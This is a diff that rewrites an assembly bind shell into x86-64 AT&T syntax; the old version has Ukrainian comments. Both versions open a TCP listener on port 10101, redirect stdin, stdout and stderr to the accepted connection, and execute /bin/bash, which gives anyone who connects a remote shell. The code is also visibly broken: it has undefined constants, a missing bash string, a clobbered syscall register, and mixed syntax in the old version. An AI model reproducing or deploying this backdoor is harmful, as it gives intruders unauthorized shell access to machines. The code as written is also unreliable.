@@ -1,91 +1,75 @@
-; Оголошення секцій
-.data
-sock: .space 4  ; Дескриптор сокета
-fd: .space 4    ; Дескриптор файлу
-sin: .space 16  ; Структура sockaddr_in
+/* .bss section */
+        .section .bss
+sin:
+        .space 16
 
-; Оголошення констант
-.equ AF_INET, 2
-.equ PORT, 10101
-.equ SYS_SOCKET, 102
-.equ SYS_BIND, 100
-.equ SYS_LISTEN, 103
-.equ SYS_ACCEPT, 106
-.equ SYS_DUP2, 93
-.equ SYS_EXECVE, 11
-.equ STDIN, 0
-.equ STDOUT, 1
-.equ STDERR, 2
+/* .data section */
+        .section .data
+        .globl sock
+        .globl fd
+sock:
+        .long 0
+fd:
+        .long 0
 
-.text
-; Головна функція
+/* .text section */
+        .section .text
+        .globl main
 main:
-    ; Створення TCP-сокета
-    push SYS_SOCKET
-    mov eax, AF_INET
-    mov ebx, SOCK_STREAM
-    mov ecx, IPPROTO_TCP
-    syscall
+        /* socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) */
+        movq $SYS_SOCKET, %rax
+        movq $AF_INET, %rdi
+        movq $SOCK_STREAM, %rsi
+        movq $IPPROTO_TCP, %rdx
+        syscall
 
-    ; Збереження дескриптора сокета
-    mov [sock], eax
+        /* store socket descriptor */
+        movq %rax, sock(%rip)
 
-    ; Заповнення структури sockaddr_in
-    movw AF_INET, [sin + sin_family]
-    movw PORT, eax
-    xchgb %ah, %al
-    movw %ax, [sin + sin_port]
+        /* sin.sin_family = AF_INET */
+        movw $AF_INET, sin(%rip)
 
-    ; Прив'язка сокета до адреси
-    push SYS_BIND
-    mov rdi, [sock]
-    mov rsi, sin
-    mov rdx, sizeof(sin)
-    syscall
+        /* sin.sin_port = htons(10101) */
+        movw $10101, %ax
+        xchgb %ah, %al
+        movw %ax, sin+2(%rip)
 
-    ; Встановлення режиму прослуховування
-    push SYS_LISTEN
-    mov rdi, [sock]
-    mov rsi, 1
-    syscall
+        /* bind(sock, &sin, sizeof(sin)) */
+        movq $SYS_BIND, %rax
+        movq sock(%rip), %rdi
+        leaq sin(%rip), %rsi
+        movq $16, %rdx
+        syscall
 
-    ; Прийняття вхідного з'єднання
-    push SYS_ACCEPT
-    mov rdi, [sock]
-    mov rsi, NULL
-    mov rdx, NULL
-    syscall
+        /* listen(sock, 1) */
+        movq $SYS_LISTEN, %rax
+        movq sock(%rip), %rdi
+        movq $1, %rsi
+        syscall
 
-    ; Збереження дескриптора файлу
-    mov [fd], eax
+        /* accept(sock, NULL, NULL) */
+        movq $SYS_ACCEPT, %rax
+        movq sock(%rip), %rdi
+        movq $0, %rsi
+        movq $0, %rdx
+        syscall
 
-    ; Дублювання дескриптора файлу для stdin
-    push SYS_DUP2
-    mov rdi, [fd]
-    mov rsi, STDIN
-    syscall
+        /* store file descriptor */
+        movq %rax, fd(%rip)
 
-    ; Дублювання дескриптора файлу для stdout
-    push SYS_DUP2
-    mov rdi, [fd]
-    mov rsi, STDOUT
-    syscall
+        /* dup2(fd, stdin), dup2(fd, stdout), dup2(fd, stderr) */
+        movq $SYS_DUP2, %rax
+        movq fd(%rip), %rdi
+        movq $0, %rsi
+        syscall
+        movq $1, %rsi
+        syscall
+        movq $2, %rsi
+        syscall
 
-    ; Дублювання дескриптора файлу для stderr
-    push SYS_DUP2
-    mov rdi, [fd]
-    mov rsi, STDERR
-    syscall
-
-    ; Запуск /bin/bash
-    mov rdi, bash
-    xor rsi, rsi
-    xor rdx, rdx
-    push SYS_EXECVE
-    syscall
-
-    ; Вихід з програми
-    mov eax, 60
-    xor ebx, ebx
-    int 80h
-
+        /* execve("/bin/bash", NULL, NULL) */
+        movq $SYS_EXECVE, %rax
+        movq $bash, %rdi
+        xor %rsi, %rsi
+        xor %rdx, %rdx
+        syscall
